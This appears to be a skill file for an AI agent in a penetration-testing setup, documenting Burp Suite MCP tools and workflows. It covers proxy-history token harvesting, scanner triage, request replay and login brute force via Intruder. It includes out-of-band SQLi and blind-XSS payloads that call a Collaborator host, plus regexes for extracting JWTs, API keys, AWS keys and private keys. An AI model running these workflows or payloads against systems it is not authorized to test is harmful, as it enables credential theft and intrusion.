---
name: burp-mcp
description: Burp Suite MCP integration — autonomous proxy history mining, scanner issue triage, sitemap mapping, request replay (Repeater/Intruder), Collaborator OOB detection, token/session extraction, and pattern detection. Use when operating on Burp traffic, analyzing proxy history, triaging scanner issues, replaying requests, or extracting auth material from intercepted traffic.
category: meta-orchestration
---

# Burp Suite MCP Integration

## Available Tools (20+)

### Request Sending
| Tool | Use |
|------|-----|
| `burp_send_http1_request` | Send HTTP/1.1 request via Burp proxy |
| `burp_send_http2_request` | Send HTTP/2 request (preferred for modern targets) |
| `burp_create_repeater_tab` | Create HTTP/1.1 Repeater tab for manual testing |
| `burp_create_repeater_tab_http2` | Create HTTP/2 Repeater tab (default for modern targets) |
| `burp_send_to_intruder` | Send request to Intruder for fuzzing |

### Traffic Analysis
| Tool | Use |
|------|-----|
| `burp_get_proxy_http_history` | Read proxy HTTP history (paginated: offset + count) |
| `burp_get_proxy_http_history_regex` | Filter proxy history by regex |
| `burp_get_proxy_websocket_history` | Read WebSocket messages |
| `burp_get_proxy_websocket_history_regex` | Filter WebSocket history by regex |
| `burp_get_scanner_issues` | Get Burp scanner findings (paginated) |
| `burp_get_organizer_items` | Read Organizer items |
| `burp_get_organizer_items_regex` | Filter Organizer by regex |

### OOB / Collaborator
| Tool | Use |
|------|-----|
| `burp_generate_collaborator_payload` | Generate Collaborator OOB payload URL |
| `burp_get_collaborator_interactions` | Poll for OOB interactions (DNS/HTTP/SMTP) |

### Configuration
| Tool | Use |
|------|-----|
| `burp_set_project_options` | Set project-level config |
| `burp_get_project_options` | Get project-level config |
| `burp_set_user_options` | Set user-level config |
| `burp_get_user_options` | Get user-level config |
| `burp_set_proxy_intercept_state` | Enable/disable intercept |
| `burp_set_task_execution_engine_state` | Pause/unpause scanner |

### Utilities
| Tool | Use |
|------|-----|
| `burp_generate_random_string` | Generate random string (for payloads) |
| `burp_url_encode` / `burp_url_decode` | URL encoding/decoding |
| `burp_base64_encode` / `burp_base64_decode` | Base64 encoding/decoding |
| `burp_get_active_editor_contents` | Read editor contents |
| `burp_set_active_editor_contents` | Write editor contents |

---

## Workflow 1: Proxy History Mining (Token/Session Extraction)

### Poll for new items
```
# First pass — get last 50 items
burp_get_proxy_http_history(offset=0, count=50)

# Subsequent passes — use regex to filter for target domain
burp_get_proxy_http_history_regex(regex="target\.com", offset=0, count=100)
```

### Extract tokens from responses
Look for these patterns in response headers and bodies:

**Cookies (Set-Cookie headers):**
```
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiJ9...; Path=/
Set-Cookie: csrf_token=xyz789; Path=/
```

**JWT tokens (Authorization headers or response bodies):**
```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```
Decode JWT payload (base64url): `echo "eyJ..." | base64 -d 2>/dev/null | jq .`

**API keys (response bodies, headers):**
```
X-API-Key: ak_live_abc123
"api_key": "sk-abc123def456"
"access_token": "ghp_abc123"
```

**CSRF tokens:**
```
"csrf_token": "abc123"
"csrfmiddlewaretoken": "abc123"
<input name="_token" value="abc123">
```

**OAuth tokens:**
```
"access_token": "ya29.a0AfH6SMB..."
"refresh_token": "1//0gabc..."
```

### Save extracted tokens
Write to `burp/tokens.md`:
```markdown
## Extracted Tokens (timestamp)
| Type | Value | Source | Endpoint |
|------|-------|--------|----------|
| Session Cookie | session=abc123 | Set-Cookie header | POST /login |
| JWT | eyJhbGci... | Authorization header | GET /api/user |
| API Key | sk-abc123 | Response body | POST /api/keys |
| CSRF Token | xyz789 | Response body | GET /forms/profile |
```

### Save session state
Write to `burp/session-state.md`:
```markdown
## Session State
- Cookies: session=abc123; csrf=xyz789
- JWT: Bearer eyJhbGci...
- Headers: X-API-Key: sk-abc123
- User-Agent: Mozilla/5.0...
```

---

## Workflow 2: Scanner Issue Triage

### Poll scanner issues
```
burp_get_scanner_issues(offset=0, count=50)
```

### Triage by severity
| Severity | Action |
|----------|--------|
| **High/Critical** | Send to @exploit immediately with full evidence |
| **Medium** | Send to @vuln for hypothesis testing, then @chain |
| **Low/Information** | Log for potential chaining, don't report standalone |

### False positive filtering
For each scanner issue:
1. **Verify manually** — send the request via Repeater to confirm
2. **Check context** — is the finding in a real user-facing flow?
3. **Assess impact** — can this actually harm a user/tenant?
4. **Check duplicates** — is this already reported?

### Feed to agents
```
Scanner issue: SQLi on /api/search?q=
→ Send to @vuln: "Burp scanner flagged SQLi on /api/search?q= — verify with payload"

Scanner issue: XSS on /profile/name
→ Send to @exploit: "Stored XSS on profile name — Burp confirmed, test impact"

Scanner issue: Missing HSTS
→ Log only, don't report (T4, no impact)
```

---

## Workflow 3: Sitemap / Attack Surface Mapping

### Build sitemap from history
```
# Get all unique URLs from proxy history
burp_get_proxy_http_history_regex(regex="target\.com", offset=0, count=500)

# Extract and categorize:
# 1. All unique paths
# 2. All unique parameters
# 3. All HTTP methods used
# 4. All content types accepted
# 5. Auth patterns (which endpoints need auth)
```

### Map parameters
For each endpoint, track:
- Parameters (GET, POST, JSON body, headers)
- Methods allowed (GET, POST, PUT, DELETE, PATCH)
- Auth required (cookie, JWT, API key, none)
- Content types (JSON, form-data, XML, multipart)
- Rate limiting (observed 429s, timing diffs)

### Save to burp/surface.md
```markdown
## Attack Surface (from Burp history)
### P0 — Auth/Payment/API
| Endpoint | Methods | Params | Auth | Notes |
|----------|---------|--------|------|-------|
| POST /api/login | POST | email, password | None | Rate limited |
| GET /api/users/{id} | GET | id (UUID) | JWT | IDOR potential |
| POST /api/payment | POST | amount, currency, token | JWT | Price manipulation? |

### P1 — Admin/Management
| Endpoint | Methods | Params | Auth | Notes |
|----------|---------|--------|------|-------|
| GET /admin/users | GET | page, limit | JWT (admin) | Role check needed |
```

---

## Workflow 4: Request Replay & Testing

### Send request via Burp
```
# Basic request
burp_send_http1_request(
  content="GET /api/users/123 HTTP/1.1\nHost: target.com\nCookie: session=abc123",
  targetHostname="target.com",
  targetPort=443,
  usesHttps=true
)

# HTTP/2 (preferred for modern targets)
burp_send_http2_request(
  headers={"Host": "target.com", "Authorization": "Bearer eyJ..."},
  pseudoHeaders={":path": "/api/users/123", ":method": "GET", ":scheme": "https"},
  requestBody="",
  targetHostname="target.com",
  targetPort=443,
  usesHttps=true
)
```

### Create Repeater tab for manual testing
```
# HTTP/1.1
burp_create_repeater_tab(
  content="GET /api/users/123 HTTP/1.1\nHost: target.com\nCookie: session=abc123",
  targetHostname="target.com",
  targetPort=443,
  usesHttps=true,
  tabName="IDOR-User-123"
)

# HTTP/2 (preferred)
burp_create_repeater_tab_http2(
  headers={"Host": "target.com", "Authorization": "Bearer eyJ..."},
  pseudoHeaders={":path": "/api/users/123", ":method": "GET", ":scheme": "https"},
  requestBody="",
  targetHostname="target.com",
  targetPort=443,
  usesHttps=true,
  tabName="IDOR-User-123"
)
```

### Send to Intruder for fuzzing
```
burp_send_to_intruder(
  content="POST /api/login HTTP/1.1\nHost: target.com\n\n{\"email\":\"admin@target.com\",\"password\":\"§payload§\"}",
  targetHostname="target.com",
  targetPort=443,
  usesHttps=true,
  tabName="Login-BruteForce"
)
```

---

## Workflow 5: OOB / Collaborator Detection

### Generate Collaborator payload
```
burp_generate_collaborator_payload(customData="ssrf-test")
# Returns: http://xyz123.burpcollaborator.net
```

### Inject into target
Use the Collaborator URL in payloads:
```
# SSRF
{"url": "http://xyz123.burpcollaborator.net"}
# SQLi OOB
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.xyz123.burpcollaborator.net\\a'))--
# Blind XSS
<script src="http://xyz123.burpcollaborator.net/xss.js"></script>
# Template injection
{{7*7}}${7*7}
```

### Check for interactions
```
burp_get_collaborator_interactions(payloadId="xyz123")
# Look for: DNS lookups, HTTP callbacks, SMTP interactions
```

---

## Workflow 6: Pattern Detection

### Sequential ID detection
From proxy history, look for:
- `/api/users/123` → `/api/users/124` (sequential numeric IDs)
- `/api/items/abc-def-001` → `/api/items/abc-def-002` (predictable UUIDs)
- `?id=1001` → `?id=1002` (incrementing params)

### Verbose error patterns
Look for in responses:
- Stack traces (Java, .NET, Python, Node.js)
- Database errors (MySQL, PostgreSQL, MongoDB syntax errors)
- Framework debug info (Laravel, Django, Rails debug pages)
- Version disclosure (Server header, X-Powered-By, generator meta)

### Auth inconsistency
Compare:
- Response size/status for authenticated vs unauthenticated requests
- Different endpoints that should require auth but don't
- Role-based endpoints accessible with lower-privilege tokens

### Hidden endpoint discovery
From history, extract:
- 404 responses (hidden endpoints that exist but aren't linked)
- 403 responses (forbidden — worth trying with different auth)
- 405 responses (wrong method — try POST/PUT/DELETE/PATCH)
- Responses with interesting headers (X-Debug, X-Internal, X-Rate-Limit)

---

## Workflow 7: Interceptor Mode (Live Testing)

### Enable intercept for specific requests
```
burp_set_proxy_intercept_state(intercepting=true)
# ... send request from browser/target ...
# Read intercepted request
burp_get_active_editor_contents()
# Modify and forward
burp_set_editor_contents(text="modified request")
burp_set_proxy_intercept_state(intercepting=false)
```

---

## Agent Integration Hooks

### → @map (endpoints)
Feed: all unique endpoints, parameters, methods from sitemap/history
```
"From Burp history: 45 unique endpoints found, 12 have admin paths, 8 use JWT auth"
```

### → @vuln (hypotheses)
Feed: scanner issues as ranked hypotheses
```
"Burp scanner: SQLi on /api/search?q= (High) — test with UNION-based payload"
"Burp scanner: IDOR on /api/users/{id} (Medium) — test IDOR chain"
```

### → @exploit (confirmed findings)
Feed: confirmed issues with Burp evidence
```
"CONFIRMED: SQLi on /api/search?q= — extracted DB version via error-based. Evidence in Repeater tab 'SQLi-Search'"
```

### → @shadow (session material)
Feed: cookies, tokens, session state for manual testing
```
"Session: cookies=session=abc123;csrf=xyz789, JWT=Bearer eyJ..., User-Agent=Mozilla/5.0..."
```

### → @accounts (tokens)
Feed: auth tokens for identity provisioning
```
"New user tokens: session=def456, JWT=Bearer eyJ2..., API Key=sk-abc123"
```

### → @audit (signals)
Feed: pattern anomalies from history
```
"Pattern: /api/v1/users/{id} accessible without auth — possible auth bypass on v1 endpoints"
```

### → @chain (combinations)
Feed: multiple low-severity issues that chain
```
"Low: open redirect on /redirect?url= + Low: OAuth callback accepts any redirect_uri = CRITICAL chain"
```

---

## Extraction Regex Patterns

```bash
# JWT
eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.?[A-Za-z0-9_-]{0,}

# Session cookies
session=[A-Za-z0-9_-]{20,}
sid=[A-Za-z0-9_-]{20,}
PHPSESSID=[A-Za-z0-9]{26,}

# API keys
sk-[A-Za-z0-9]{20,}
ak_[A-Za-z0-9]{20,}
api[_-]?key["\s:=]+["']?[A-Za-z0-9_-]{20,}

# OAuth tokens
ghp_[A-Za-z0-9]{36}
ya29\.[A-Za-z0-9_-]{50,}
xox[bpsa]-[A-Za-z0-9-]{10,}

# CSRF tokens
csrf[_-]?token["\s:=]+["']?[A-Za-z0-9_-]{20,}
_csrf["\s:=]+["']?[A-Za-z0-9_-]{20,}

# Bearer tokens
Bearer\s+[A-Za-z0-9_-]{20,}

# AWS keys
AKIA[0-9A-Z]{16}

# Private keys
-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----
```

---

## Output Format

Always save findings to `burp/` directory:
```
burp/
├── tokens.md          # Extracted auth material
├── session-state.md   # Current session state
├── surface.md         # Attack surface map
├── issues.md          # Scanner issue triage
├── patterns.md        # Detected patterns
├── findings.md        # Confirmed findings for @exploit
└── history-log.md     # History mining log
```
